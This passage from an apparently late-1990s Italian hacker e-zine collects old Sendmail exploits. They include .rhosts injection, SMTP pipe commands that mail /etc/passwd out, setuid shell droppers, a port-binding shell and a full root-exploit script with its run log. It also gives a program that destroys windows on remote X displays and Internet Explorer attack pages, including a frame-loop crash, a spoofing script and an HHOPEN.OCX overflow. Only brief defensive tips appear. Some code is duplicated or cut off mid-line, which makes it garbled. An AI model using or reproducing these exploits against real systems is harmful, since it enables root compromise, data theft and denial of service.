Problem: /etc/aliases sometimes contains: decode: |/usr/bin/uudecode
Just comment it out.

% cat > outfile                  # Lets make our .rhosts file
+ +
^C
% uuencode outfile /usr/bin/.rhosts
begin 644 /usr/bin/.rhosts
$*R`K"@``
`
end
% telnet 127.1 25
Trying 127.0.0.1...
Connected to 127.1.
Escape character is '^]'.
220 fred Sendmail 5.64/zippy-1.22.01 ready at Mon, 24 Jul 95 09:34:12
-0400 (GMT)
helo
250 fred Hello  (localhost), pleased to meet you     # Howz it hangin?
mail from: bin
250 bin... Sender ok
rcpt to: decode
250 decode... Recipient ok
data
354 Enter mail, end with "." on a line by itself
begin 644 /usr/bin/.rhosts  # just type our uuencoded + +
$*R`K"@``
`
end
.
250 Ok
quit
221 fred closing connection
Connection closed by foreign host.
% ls -al /usr/bin/.rhosts
-rw-r--r--  1 bin        4 Jul 24 09:34 .rhosts

This is the same as:

% echo "myhost.com" | uuencode /usr/bin/.rhosts | mail decode@target.com

-----
BUG 2
-----

[From CSC FAQ, credit to J. Rawlinson]

---cut here
[panix!jhawk] |% telnet panix.com 25
Trying 198.7.0.2 ...
Connected to panix.com.
Escape character is '^]'.
220 panix.com 5.65c/IDA-1.4.4 Sendmail is ready at Mon, 8 Nov 1993 19:41:13
-0500
HELO
250 Hello panix.com, why do you call yourself ?
MAIL FROM: |/usr/ucb/tail|/usr/bin/sh
250 |/usr/ucb/tail|/usr/bin/sh... Sender ok
RCPT TO: root
250 root... Recipient ok
DATA
354 Enter mail, end with @.@ on a line by itself
 From: jhawk"panix.com (John Hawkinson)
  To: jhawk"panix.com (John Hawkinson)
  Return-Receipt-To: |foobar
  Subject: This is a large hole in the ground.
  X-Disclaimer: We take no responsibility for what might happen

  Hi there. Wanna play ball?

  #!/bin/sh
  #The above line is just in case :-)
  echo This is a Serious Bug > /tmp/bug
  echo id reports: >> /tmp/bug
  /usr/bin/id >> /tmp/bug
  echo Fixing this would be good >> /tmp/bug
  cp /bin/sh /tmp/bugshell
  chmod u+s /tmp/bugshell
  echo /tmp/bugshell contains a setuid daemon shell >> /tmp/bug
  chmod ugo+rx /tmp/bugshell
.
250 Ok
quit
221 panix.com closing connection

-----
BUG 3
-----

Version affected: 8.6.7

A bug in Sendmail 8.6.7 allows anyone to read any file,
including the shadowed password file:

/usr/lib/sendmail -oE/etc/shadow bounce
From: your_username

-----
BUG 4
-----

Sendmail: 5.x

You can have your host appened to someones .rhosts file,by issuing
the request twice in this example it's myhost.com:

 % cat sendmail_haq
 telnet target.com 25 << EOSM
 rcpt to: /home/students/twit/.rhosts
 mail from: twit
 data
 hello :) dewd
 .
 rcpt to: /home/students/twit/.rhosts
 mail from: twit
 data
 myhost.com
 .
 quit
 EOSM

 evil % /bin/sh sendmail_haq
 Trying 123.456.789.0
 Connected to target.com
 Escape character is '^]'.
 Connection closed by foreign host.

 % rlogin target.com -l twit
 %

-----
BUG 5
-----

Sendmail: 5.55

Some versions allow us to execute commands; often leading to
interesting effects like password file grabbing:

 % telnet target.com 25
 Trying 123.456.789.0...
 Connected to target.com
 Escape character is '^]'.
 220 target.com Sendmail 5.55 ready at Mon, 12 Dec 93 23:51
 mail from: "|/bin/mail me@myhost.com < /etc/passwd"
 250 "|/bin/mail me@myhost.com < /etc/passwd"... Sender ok
 rcpt to: mickeymouse
 550 mickeymouse... User unknown
 data
 354 Enter mail, end with "." on a line by itself
 .
 250 Mail accepted
 quit
 Connection closed by foreign host.
 %

-----
Bug 6
-----

Sendmail: 4.1

By Lineman

It allows remote access as bin...and since bin owns the /etc dir you
can gain root.

Rsend needs mconnect, which is a binary, which just connects to the place
and sends the data.  You can get rid the of ()'s at the beginninga and end
of the script, and get rid of the mconnect line, and run like ./rsend >
file, then ascii U/L the file to port 25...If it says a lot of stuff like
"Command Ununown" 25 times, then it didn't work.

Here's rsend:

#!/bin/sh
# Copyright, 1992, 1993 by Scott Chasin (chasin@crimelab.com)
#
# This material is copyrighted by Scott Chasin, 1992, 1993. The
# usual standard disclaimer applies, especially the fact that the
# author is not liable for any damages caused by direct or indirect
# use of the information or functionality provided by this program.
#
# Description:
#
# Exploit NEW sendmail hole  and bind a port so we can spawn a program.
# Not for distribution under any circumstances
#
# Usage: smail
# default: smail   <7001>

port=$3
user=$2
cmd=$4

if [ -z "$2" ]; then
   user=daemon
fi

if [ -z "$3" ]; then
   port=7002
fi

if [ -z "$4" ]; then
   cmd="/bin/csh -i"
fi

(
sleep 4
echo "helo"
echo "mail from: |"
echo "rcpt to: bounce"
echo "data"
echo "."
sleep 3
echo "mail from: $user"
echo "rcpt to: | sed '1,/^$/d' | sh"
echo "data"
echo "cat > /tmp/a.c <
#include
#include
#include
#include
reap(){int s;while(wait(&s)!=-1);}main(ac,av)int ac;
int **av;{struct sockaddr_in mya;struct servent *sp
;fd_set muf;int myfd,new,x,maxfd=getdtablesize();
signal(SIGCLD,reap);if((myfd=socket(AF_INET,SOCK_STREAM,
0))<0)exit(1);mya.sin_family=AF_INET;bzero(&mya.sin_addr,
sizeof(mya.sin_addr));if((sp=getservbyname(av[1],"tcp"))
==(struct servent *)0){if(atoi(av[1])<=0)exit(1);mya.sin_port
=htons(atoi(av[1]));}else mya.sin_port=sp->s_port;if(bind(myfd,
(struct sockaddr *)&mya,sizeof(mya)))exit(1);if(listen(myfd,
1)<0)exit(1);loop: FD_ZERO(&muf);FD_SET(myfd,&muf);if
(select(myfd+1,&muf,0,0,0)!=1||!FD_ISSET(myfd,&muf))goto
loop;if((new=accept(myfd,0,0))<0)goto loop;if(fork()
==0){for(x=2;x /tmp/a.c <
#include
#include
#include
#include
reap(){int s;while(wait(&s)!=-1);}main(ac,av)int ac;
int **av;{struct sockaddr_in mya;struct servent *sp
;fd_set muf;int myfd,new,x,maxfd=getdtablesize();
signal(SIGCLD,reap);if((myfd=socket(AF_INET,SOCK_STREAM,
0))<0)exit(1);mya.sin_family=AF_INET;bzero(&mya.sin_addr,
sizeof(mya.sin_addr));if((sp=getservbyname(av[1],"tcp"))
==(struct servent *)0){if(atoi(av[1])<=0)exit(1);mya.sin_port
=htons(atoi(av[1]));}else mya.sin_port=sp->s_port;if(bind(myfd,
(struct sockaddr *)&mya,sizeof(mya)))exit(1);if(listen(myfd,
1)<0)exit(1);loop: FD_ZERO(&muf);FD_SET(myfd,&muf);if
(select(myfd+1,&muf,0,0,0)!=1||!FD_ISSET(myfd,&muf))goto
loop;if((new=accept(myfd,0,0))<0)goto loop;if(fork()
==0){for(x=2;x
 * a quick hack to abuse sendmail 8.6.9 or whatever else is subject to this
 * hole.  It's really just a matter of passing newlines in arguments to
 * sendmail and getting the stuff into the queue files.  If we run this
 * locally with -odq we are guaranteed that it will be queue, rather than
 * processed immediately.  Wait for the queue to get processed automatically
 * or just run sendmail -q if you're impatient.

 * usage: smh [ username [/path/to/sendmail]]

 * It's worth noting that this is generally only good for getting bin.
 * sendmail still wants to process the sendmail.cf file, which contains
 * Ou1 and Og1 most of the time, limiting you to bin access.  Is there
 * a way around this?

 * cc -o smh smh.c should do the trick.  This just creates a bin owned
 * mode 6777 copy of /bin/sh in /tmp called /tmp/newsh.  Note that on some
 * systems this is pretty much worthless, but you're smart enough to know
 * which systems those are.  Aren't you?
 */

#include
#include
#include

main(argc, argv)
int argc;
char **argv;
{
        execlp(argv[2] ? argv[2] : "sendmail","sendmail","-odq","-p",
        "ascii\nCroot\nMprog, P=/bin/sh, F=lsDFMeu, A=sh -c $u\nMlocal, P=/bin/sh, F=lsDFMeu,
A=sh -c $u\nR<\"|/bin/cp /bin/sh /tmp/newsh\">\nR<\"|/bin/chmod 6777 /tmp/newsh\">\n$rascii ",
        argv[1] ? argv[1] : "atreus",0);
}

-----
Bug 8
-----

Version: 8.6.?

To read a file you ran:

/usr/lib/sendmail -C/home/path/of/file

------
Bug 9
------

Sendmail: 8.6.4

/* What follows is a sample run exercising the latest sendmail hole and the
script used to exploit this hole.  This is a re-send; I neglected
to escape the "." in the sendmail script, leaving the program
slightly truncated.  To fix this, I have escaped the . so prior
to executing this you must remove the \.  (does that make any sense? :-)
There was also a small problem with nested quotes pointed out by Peter
Wemm which I have fixed.

This is the "small version" of the script; it assumes you have a sane
sendmail.cf.  In this manner, it is not a particularly robust "breakin
script" but I believe it does illustrate how to exploit the bug.

This program uses "calc.c," the program mentioned by Timothy Newsham in
an earlier message.  The program has been modified slightly so that it
gives better results (it would occasionally fail to locate the offset of
a config given a buggy sendmail.  The fix is to force a sync() after
it generates a coredump.)  The remainder of the program was written
by myself and a fellow student, Steven Dake.

We have held off on releasing this script until we were able to notify
the people responsible for system security at NAU.  Locals subscribing
to this digest beware; sendmail on our machines has been patched! :-) */

Script started on Thu Mar 24 00:54:54 1994
[pine] [1] date
Thu Mar 24 00:54:57 MST 1994
[pine] [2] whoami
jwa
[pine] [3] id
uid=4473(jwa) gid=400(student)
[pine] [4] ls -l sendbug.sh
-rwx------   1 jwa      student     4893 Mar 24 00:46 sendbug.sh*
[pine] [5] sendbug.sh
Creating setid0 ...
Creating calc...
Scanning core image for /nau/local/lib/mail/sendmail.cf...
Creating alias.sh ...
Creating fake alias file...
Faking alias pointer in new config file...
Creating the sendmail script...
Executing /usr/lib/sendmail -
d4294935548.47,4294935549.116,4294935550.109,4294935551.112,4294935552.47,4294935553.115,429
4935554.109,4294935555.46,4294935556.9
Version 8.6.4
220-pine.cse.nau.edu Sendmail 8.6.4/WHOOP-v1.0 ready at Thu, 24 Mar 1994 00:55:21 -0700
220 ESMTP spoken here
250 pine.cse.nau.edu Hello jwa@localhost, pleased to meet you
250 ... Sender ok
250 ... Recipient ok
354 Enter mail, end with "." on a line by itself
250 AAA01803 Message accepted for delivery
503 Need MAIL before RCPT
503 Need MAIL command
500 Command unrecognized
500 Command unrecognized
221 pine.cse.nau.edu closing connection
setid0 is a suid shell.  executing...
executing /bin/csh...
pine# whoami
root
pine# id
uid=0(root) gid=0(root)
pine# exit
pine# end of script.

. and here's the program.

#!/bin/sh
# exploit new sendmail bug to give us a root shell
# 24 mar 94  jwa/scd @nau.edu
# "short version"
# tested on sunos 5.2/sendmail 8.6.4

# location of sendmail
SENDMAIL=/usr/lib/sendmail

# location of original sendmail.cf file
CONFIG=/nau/local/lib/mail/sendmail.cf
#CONFIG=`strings $SENDMAIL | grep sendmail.cf`

# program to execute as root
SHELL=/bin/csh

TEMPDIR=/tmp/sendbug-tmp.$$
mkdir $TEMPDIR
chmod 700 $TEMPDIR
cd $TEMPDIR

cp $SENDMAIL sm
chmod 700 sm

echo "Creating setid0 ..."
cat > setid.c << _EOF_

/* set uid to zero, thus escaping the annoying csh and solaris sh
 * problem..
 *
 * if (getuid() != geteuid()) {
 *  printf("permission denied, you root-hacker you.\n");
 *  exit(1);
 * }
 *
 * .. must be run euid 0, obviously.  with no args it runs /bin/sh,
 * otherwise it runs the 1st arg.
 */

#include

main(argc, argv)
int argc;
char *argv[];

 int uid;

 setuid(0);
 setgid(0);
 seteuid(0);  /* probabally redundant. */
 setegid(0);

 uid = getuid();

 if (uid != 0) {
  printf("setuid(0); failed!  aborting..\n");
  exit(1);
 }

 if (argc !=2) {
  printf("executing /bin/sh...\n");
  system("/bin/sh");
 }
  else
 {
  printf("executing %s...\n", argv[1]);
  system(argv[1]);
 }

_EOF_

cc -o setid0 setid.c

echo "Creating calc..."

cat > calc.c << _EOF_
/*
 * Determines offset in sendmail of
 * sendmail.cf file location.
 * author: timothy newsham
 */
#include

gencore()

  int pid;
  int fd[2];

  if(pipe(fd) < 0) {
    perror("pipe");
    exit(1);
    return(0);
  }
  pid = fork();
  if(!pid) {
    int f = open("./out", O_RDWR|O_CREAT, 0666);
    dup2(f, 1); dup2(fd[0], 0);
    close(f); close(fd[1]); close(fd[0]);
    execl("./sm","sm","-d0-9.90","-oQ.","-bs", 0);
    perror("exec");
    exit(0);
  } else {
    sleep(2);
    kill(pid, 11);
  }
  close(fd[0]);
  close(fd[1]);

main(argc,argv)
char **argv;
int argc;

  unsigned int ConfFile,tTdvect,off;

  gencore();
  sync();   /* grr. */
  tTdvect = find("ZZZZZZZZ", "core");
  ConfFile = find(argv[1], "core");
  if(!tTdvect || !ConfFile) {
   return(1);
  }
  off = ConfFile - tTdvect;

  printf("-d%u.%d,%u.%d,%u.%d,%u.%d,%u.%d,%u.%d,%u.%d,%u.%d,%u.%d,%u.%d,%u.0\n",
  off, '/', off+1, 't', off+2, 'm', off+3, 'p', off+4, '/', off+5, 's', \
  off+6, 'm', off+7, '.', off+8, 'c', off+9, 'f', off+10);

int find(pattern, file)
char *pattern,*file;

  int fd;
  int i, addr;
  char c;

  fd = open(file, 0);

  i = 0;
  addr = 0;
  while(read(fd, &c, 1) == 1) {
    if(pattern[i] == c)
      i++;
    else
      i=0;
    if(pattern[i] == '\0') {
      addr -= strlen(pattern);
      return(addr);
    }
    addr++;
  }
  return(0);

_EOF_
cc calc.c -o calc

echo "Scanning core image for $CONFIG..."

DEBUGFLAGS=`calc $CONFIG`

echo "Creating alias.sh ..."
echo "#!/bin/sh
# this program will be executed when mail is sent to the fake alias.
# since solaris sh and csh and tcsh refuse to run when euid != realuid,
# we instead run the program we compiled above.

/bin/chmod 6777 $TEMPDIR/setid0
/bin/chown root $TEMPDIR/setid0
/bin/sync

" > alias.sh

chmod 755 alias.sh

echo "Creating fake alias file..."
echo "yash: |$TEMPDIR/alias.sh" > aliases

echo "Faking alias pointer in new config file..."
egrep -v '(OA|DZ|Ou|Og)' $CONFIG > /tmp/sm.cf
echo "
# hacks follow

OA/$TEMPDIR/aliases                     # our fake alias file
Ou0                                     # user ID to run as
Og0                                     # group ID to run as
DZWHOOP-v1.0" >> /tmp/sm.cf

echo "Creating the sendmail script..."

cat > sendmail.script << _EOF_
helo
mail from:
rcpt to:
data
yet another sendmail hole?  suid whoop?
\.                                      # oops.. delete \ prior to execution
quit
_EOF_

echo "Executing $SENDMAIL $DEBUGFLAGS -bs..."

$SENDMAIL $DEBUGFLAGS -bs < sendmail.script

# give it time to execute.
sleep 4

# cleanup in 5 seconds
(sleep 5; rm -rf $TEMPDIR ; rm /tmp/sm.cf) &

if [ -u setid0 ]
then
 echo "setid0 is a suid shell.  executing..."
 cd /
 $TEMPDIR/setid0 /bin/csh
 echo "end of script."
 exit 0
else
 echo "setid0 is not suid; script failed."
 echo "apparently, you don't have the bug.  celebrate :-)"
 exit 1
fi

----------------------------------------------------------------------------

Se proprio dovete usare Sendmail [ che lo usate a fare? e' brutto e
antipatico =) ] vi conviene tenervi _costantemente_
aggiornati sulle sue nuove versioni [ www.sendmail.org ]. Inoltre
se avete una connessione dial-up e non volete che gli altri usino
il vostro mail server per mandare posta a tutti gli amici sparsi per il
mondo mentre fate le vostre faccende su IRC , togliete i flag "-bd" dallo
startup script di sendmail.

Valide alternative a sendmail sono qmail [ www.qmail.org ] e postfix
[ www.postfix.org ].

[X WINDOWS SYSTEM]

Proprio per il fatto che Unix e' stato pensato PER e CON la rete 
il concetto client-server e' ampiamente sfruttato anche per quanto
riguarda l'interfaccia grafica. Uno dei pericoli che si corre quando
si ha X aperto e' che qualcuno possa fare uno screendump e magari 
beccare una immagine di quando state digitando qualcosa di importante.
O magari beccare la foto della vostra ragazza nuda , il che [ a me si
non so a voi ] mi farebbe incazzare non poco. Ovviamente non sono cosi'
malato da mettere sul mio pc immagini di questo genere, ma...la rete 
e' grande. Ad ogni modo...una finestra X e' di solito un server aperto a 
ricevere connessioni. 

Supponiamo che l'host su cui gira X accetti connessioni sulla porta
6000 [ quella sulla quale gira il server X ]. L'ipotetico acaro
potrebbe usare la funzione XOpenDisplay() . Questa e' usata anche da
SATAN e potrebbe rivelare o meno l'accessibilita' del server X in 
questione.

    char   *hostname;

    if (XOpenDisplay(hostname) == NULL) {
       printf("Cannot open display: %s\n", hostname);
    } else {
       printf("Can open display: %s\n", hostname);
    }


Per abilitare il controllo di accesso a questo server ed inculare
l'acaro facendogli uscire il "Cannot open display" potete usare :

$ xhost -
vieta a tutti gli host [ tranne 127.0.0.1 ] di potersi connettere

$ xhost + 
permette a qualunque host di connettersi al server.
 
A questo punto sembrerebbe cosa fatta. Ok, sono al sicuro, ho fatto
"xhost -" e sono tranquillo...eh....sti' cazzi. E se l'acaro puo' 
eseguire un login sulla vostra macchina e dumpare in locale?

$ rlogin target
$ xwd -root -display localhost:0.0 > ~/snarfed.xwd
$ exit
$ xwud -in ~/snarfed.xwd

Dove xwd e xwud sono utility che servono a salvare e vedere immagini
"dumpate" in un formato speciale [ .xwd appunto ]

Ovviamente l'acaro deve avere avuto un account per poter effettuare
il login sul vostro sistema.

Un'altra cosa simpatica che potrebbe venire in mente all'acaro e' 
un attacco di tipo DoS sul server; mandando schifezze via telnet
sulla porta 6000, X impazzirebbe per un po' congelandosi.

Inoltre c'e' in giro per la rete una utility chiamata xkey, che logga
tutto quello che l'utenteX digita sulla tastiera. 

Insomma, fate attenzione al vostro server X tanto quanto fate attenzione
nello scegliere le password per gli account e tanto quanto fate attenzione
a settare i permessi nel vostro filesystem.

[SATAN & C.]
Durante questo lavoro di verifica di sicurezza del vostro sistema, 
potrebbe tornarvi molto utile SATAN [Security Administrator's Tool for
Analyzing Networks] reperibile presso :
<http://metalab.unc.edu/pub/packages/security/Satan-for-Linux/> 
Satan scanerizza un host in cerca di servizi vilnerabili a qualche 
attacco. Mostra un output dettagliato della "scannerizzazione".
Per maggiori informazioni leggete l'articolo su X-BRAIN n.1
"Conosci il tuo nemico" di Spitzner o quello sulle tecniche di
portscanning di TechnoK.
Di portscanner per "testare la vulnerabilita' di un sistema" se ne
trovano migliaia. [ Basta fare un giro sul web ]
C'e' poi ISS [Internet Security Scanner]
E' un altro scanner, piu' veloce di Satan e adatto a larghe 
Network. Non mostra comunque un output dettagliato come Satan.
Oltre a questi 2 citiamo anche Abacus, SAINT [versione aggiornata di
SATAN] e Nessus. Tutti servono a testare la sicurezza di un host o
un gruppo di host.

bIBLi0GRAFiA:
Improving the Security oF Your Site by Breaking Into it - Dan Farmer
IMPROVING THE SECURITY OF YOUR UNIX SYSTEM - David A. Curry
X.security - runeb / cF --- runeb@stud.cs.uit.no 

                                          thin[k] - think4free@katamail.com
[############################################################################]

                   =====================================
                         XLIB - FUNZIONI RISCHIOSE
                   =====================================

La libreria Xlib.h concernente l'X, un rischio per gli utenti di X o
un ostacolo facilmente sormontabile?

|\/-XLIB - FUNZIONI RISCHIOSE
|/-CREIAMOCI UN EXPLOIT (CON POCA FATICA E SENZA GRASSI AGGIUNTI)
|/-SOLUZIONE (SE COSI' LA VOGLIAMO CHIAMARE)

|\/-Xlib - FUNZIONI RISCHIOSE

La Xlib e' una libreria che contiene svariate funzioni che operano appunto
su finestre e operazioni di startx. Tra le tante c'e' la XOpenDisplay
che offre gratuitamente la connessione ad un X remoto.
Vediamola un po':
XOpenDisplay(host)
Basta solo specificare l'host e se quest'ultimo non e' protetto, abbiamo
il controllo sul suo X. Il risultato di questa funzione dovra' essere
contenuto in una variabile che punta al tipo Display,
A questo punto dobbiamo far credere alla macchina che quell'X manager e' il
nostro, c'e' una funzione per adempire anche questo scopo:
DefaultRootWindow(display)
L'host sara' quella variabile in cui prima abbiamo inserito il risultato della
funzione XOpenDisplay. Questa funzione e' di tipo Window e specifica la
finestra root di default.
Ok abbiamo il controllo sull'X remoto, ed ora e' di proprieta' nostra, che
altro ci resta da fare?
Ora dobbiamo passare alla gestione dei processi, con la seguente funzione:
XQueryTree(display,r,&r,&g,&f,&nf)
Display e' la variabile di prima a cui abbiamo assegnato il display remoto,
r e' la variabile a cui abbiamo assegnato la finestra root di default,
&r e' appunto l'indirizzo di codesta, g specifica i processi genitori,
f specifica i processi figli, nf specifica il numero dei processi figli.
Ok, possiamo gia' far qualcosa vero?
Aspettate, non sapete ancora come chiudere l'X remoto e come distruggere
una qualsiasi finestra remota(slurp!)
La procedura per la prima operazione e':
XCloseDisplay(display)
Display e' sempre quella solita variabile a cui abbiamo assegnato l'X remoto.
La procedura per la seconda operazione e':
XDestroyWindow(display,n)
Display e' la variabile a cui abbiamo assegnato l'X remoto ed n e' il numero
della finestra da chiudere.

Hmm........state pensando la stessa cosa che penso io?

|/-CREIAMOCI UN EXPLOIT (CON POCA FATICA E SENZA GRASSI AGGIUNTI)

Ora che abbiamo le basi per farlo, non ci resta che codificare il tutto.

#include <stdio.h>
#include <X11/X.h>
#include <X11/Xlib.h>
void uso();
int main(int argc,char **argv)
{
 int c;
 Display *remoto;
 Window r, g, *f
 unsigned int nf, x;
 if argc < 2 then uso(argv[1]);
 printf ("Xiller by T0rmEnt0\n\n");

 /* Se l'operazione di apertura torna il valore NULL
    si stampa un msg di errore */

 if ((remoto=XOpenDisplay(argv[1])) == NULL)
  {
   fprintf(stderr, "Non riesco ad aprire il display X remoto");
   exit(1);
  }

  /* Specifica la finestra root di default */

  r = DefaultRootWindow(remoto);

  /* Serve per riempire le variabili dichiarate
     con i parametri dell'X remoto */

  XQueryTree(remoto,r,&r,&g,&f,&nf);

  /* Si procede alla distruzione di ogni singola finestra */

  for (x = 0; x < nf; x++) XDestroyWindow(remoto, f[x]);
  XCloseDisplay(remoto);

}
void uso(char *prog)
{
 fprintf(stderr, "Uso: %s iphost",prog);
 exit(1);
}

|\- SOLUZIONE (SE COSI' La VOGLIAMO CHIAMARE)

Basta una semplice regola in un file tipo /etc/rc.d/rc.local :

ipchains -A input -p TCP -d 127.0.0.1/24 6000 -j DENY

Se la porta su cui si mette in ascolto il vostro X e' la 6000. Cosi' evitiamo
che qualsiasi utente remoto sia in grado di connettersi con il nostro X.
Possiamo anche far partire il nostro X attraverso il comando: xhost -
in questo modo si vieta l'accesso a qualsiasi utente remoto.
Ma niente vi assicura l'integrita' e la stabilita'..........ahaahahhaah!

                                                                 T0rment0

[############################################################################]

                            IE-IO-IU-II-IA
                               IE BUGS
                            IE-IO-IU-II-IA

 
Non si e' mai parlato di Windows in questa e-zine e non intendo parlavene,
voglio solo mostrarvi alcuni bug di Internet Explorer per darvi un motivo
in piu' per odiare la MicroZizz.
Il primo bug e' una vulnerabilita' dei cicli di frame.

PROBLEMA:

E' possibile creare una pagina maliziosa che quando viene visitata da un utente
di IE fa in modo che le sue risorse si consumino e, dipende dal sistema, la
macchina puo' eventualmente crashare e riavviarsi da sola.
Potete consumare tutte le risorse del sistema client creando un ciclo di frame
infinito. Create un file html che ha alcuni frame all'interno e linkate questi
frame allo stesso file html cosi' ogni volta che IE carica un nuovo frame,
ne carica ancora un altro e ancora un altro...fino a quando, dopo un po',
le risorse del client si esauriscono e il sistema crasha.
Questo bug e' stato scoperto dal laboratorio di ricerca Underground Security
raggiungibile all'url: www.ussrback.com .

Ma ora facciamo un esempio:

-----------readme.htm------------
<html>
<head>
<title>MiCr0Fakk</title>
</head>
<frameset framespacing="2" frameborder="no" rows="65,*">
  <frame src="readme.htm" name="top" margintop="0" scrolling="no" noresize>
  <frame src="readme.htm" name="top" margintop="0" scrolling="no" noresize>
  <frame src="readme.htm" name="top" margintop="0" scrolling="no" noresize>
  <frame src="readme.htm" name="top" margintop="0" scrolling="no" noresize>
  <frame src="readme.htm" name="top" margintop="0" scrolling="no" noresize>
  <frame src="readme.htm" name="top" margintop="0" scrolling="no" noresize>
  <frame src="readme.htm" name="top" margintop="0" scrolling="no" noresize>
  <frame src="readme.htm" name="top" margintop="0" scrolling="no" noresize>
  <frame src="readme.htm" name="top" margintop="0" scrolling="no" noresize>
  <noframes>
  <body bgcolor="#FFFFFF">
  <p>Questa pagina usa i frame...meno male!</p>
  </body>
  </noframes>
</frameset>
<frameset>
  <noframes>
  </noframes>
</frameset>
</html>
-----------readme.htm------------

Ahh, dimenticavo che al momento non c'e' nessun rimedio per gli utenti di IE.
L'unica cosa buona per gli utenti di win e' che il Netscape non e' infetto.

------------------------------------------------------------------------------

Il bug che ora vedremo permette addirittura di eseguire del codice arbitrario
sulla macchina client. Si tratta della vulnerabilita' che sfrutta vnd.ms.radio
Questo bug e' stato scoperto da Jeremy Kothe che l'ha subito postato su
bugtraq.
Se su un sito si crea un collegamento sfruttando vnd.ms.radio:\\ seguito da
360 byte, sul pc del client puo' essere eseguito del codice arbitrario.
Il seguente codice oltrepassa la capacita' dello stack e mostra una semplice
MessageBox, poi continua all'infinito.
In Off c'e' appunto l'offset, in text c'e' il testo da inserire invece in
binary c'e' il rispettivo codice binario.
Alcuni indirizzi sono presi dal controllo MSDXM.OCX, controllo che causa
appunto lo stack overflow.

Off Text             Binary (where non-text)
------------------------------------------------
000 vnd.ms.radio:\\j
010 kwashere9991.... C0890783
020 ..PWWP....0...00 EF0C, FF151416, 1DEBFE
030 0000000000000000
040 0000000000000000
050 0000000000000000
060 0000000000000000
070 0000000000000000
080 0000000000000000
090 0000000000000000
0A0 0000000000000000
0B0 0000000000000000
0C0 0000000000000000
0D0 0000000000000000
0E0 0000000000000000
0F0 0000000000000000
100 0000000000000000
110 0000000000000000
120 0000000000000000
130 0000000000.00000 1D
140 00.000.000.000.0 1D, 1D, 1D, 1D
150 000.o6.0000000.0 1A6F361D, 1D
160 000000.0         1D
------------------------------------------------
------------------------------------------------------------------------------

Quello che segue non e' un vero e proprio bug. Permette ad un sito di
reindirizzare una pagina di un frame verso un altro sito il cui URL rimane
occulto agli occhi del client. Spoofing, in parole povere, ma di windows..;)
Questa vulnerabilita' e' stata scoperta da Georgi Guninski.
Il codice puo' essere il seguente:

------------------------------------------------
<SCRIPT>
b=window.open("http://www.citybank.com");
function g()
{
b.frames[2].location="http://www.yahoo.com";
}
setTimeout("g()",6000);
</SCRIPT>
------------------------------------------------

L'unica soluzione e' quella di disabilitare l'opzione che permette di navigare
tra domini differenti nei sottoframe.

------------------------------------------------------------------------------

Il bug che ci appresteremo a vedere ora si tratta di un buffer overflow.
Precisamente il buffer overflow del controllo HHOPEN.OCX.
Il bug e' stato scoperto da Dacure che fa parte della crew Raza-mexicana
raggiungibile all'url www.raza-mexicana.org .
Esso sfrutta la seguente istruzione che e' inclusa nel controllo ocx:

  Hhopen1.OpenHelp(HelpFile as String, HelpSection as String) as Long

Riempendo il buffer con una stringa grande e' possibile sovrascrivere
l'indirizzo di ritorno e fare in modo che EIP punti a 0x41414141
Quindi a questo punto l'exploit si basa su:
a) Sovrascrittura dell'indirizzo di ritorno
b) Scrittura del codice nel buffer
c) Ampliazione del codice con HelpSection (nel caso che il buffer fosse
   piccolo per contenere tutto il codice)

Visto che EBX e' l'unico registro che punta a qualcosa nella stringa, basta
una semplice chiamata a EBX ed il codice arbitrario e' eseguito.
Quella che segue e' la pagina di TEST proposta dallo stesso Dacure.

---- TEST.HTM - CUT HERE ----

<html>
<head>
<title>HHOPEN.OCX IE5 Exploit</title>
</head>

<body>

<h1><font face="Arial" color="#FF0000">HHOPEN.OCX IE5 Exploit &lt;release 
1&gt;</font>
</h1>

<p><b><font color="#0000FF"><font face="Arial">by DaCure 
&lt;</font></font><a href="mailto:DaCure@bigfoot.com"><font face="Arial" 
color="#FF0000">DaCure@bigfoot.com</font></a><font face="Arial" 
color="#0000FF">&gt;
of </font><a href="http://www.raza-mexicana.org"><font face="Arial" 
color="#FF0000">RaZa-MeXiCaNa
Hackers Team</font></a></b>
</p>

<p>&nbsp;
</p>

<p><font face="Arial">Tested with<b> IE5 5.00.2614.3500</b> on 
<b>W98</b>.</font>
</p>

<p><font face="Arial">May work with other versions as well.</font>
</p>

<p><font face="Arial">This will do nothing but jump to the start of the 
buffer
(our code) wich does nothing (you have to code your own exploit) until it
crashes.</font>
</p>

<p><font face="Arial">I dind't have the time to code something so the next
release I'll put something for sure (download and execute a program, execute 
a
local file, etc.).</font>
</p>

<p><font face="Arial">We have almost unlimited posibilities with this! If 
you
combine this with other bugs... guess what? even more posibilities.</font>
</p>


<p><font face="Arial">All kinds of fun owning machines!</font>
</p>

<p>
<object classid="clsid:130D7743-5F5A-11D1-B676-00A0C9697233" id="Hhopen1" 
width="10" height="10">
  <param name="_Version" value="65536">
  <param name="_ExtentX" value="2646">
  <param name="_ExtentY" value="1323">
  <param name="_StockProps" value="0">
</object>
</p>

<script language="VbScript">
                                                                        
a = 
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
a = 
